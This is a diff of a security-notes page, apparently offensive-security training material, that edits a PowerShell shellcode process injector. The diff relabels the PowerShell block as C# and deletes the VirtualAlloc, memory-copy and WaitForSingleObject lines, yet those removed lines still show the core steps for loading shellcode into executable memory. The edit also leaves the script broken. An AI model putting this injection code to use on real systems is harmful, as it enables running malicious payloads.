@@ -186,7 +186,7 @@ int main(int argc, char **argv){
 
 {% tab title="Powershell" %}
 {% code title="Shellcode-Process-Injector.ps1" %}
-```powershell
+```csharp
 $Kernel32 = @"
 using System;
 using System.Runtime.InteropServices;
@@ -208,12 +208,10 @@ Add-Type $Kernel32
 $size = $buf.Length
 
 Write-Host "[+] VirtualAlloc()"
-[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
 $LastError
 $LastError | Out-File C:\Users\Offsec\Desktop\errors.txt -Append
 
 Write-Host "[+] Copy"
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
 $LastError
 $LastError | Out-File C:\Users\Offsec\Desktop\errors.txt -Append
 
@@ -223,7 +221,6 @@ $LastError
 $LastError | Out-File C:\Users\Offsec\Desktop\errors.txt -Append
 
 Write-Host "[+] WaitForSingleObject()"
-[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF");$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
 $LastError
 $LastError | Out-File C:\Users\Offsec\Desktop\errors.txt -Append
 
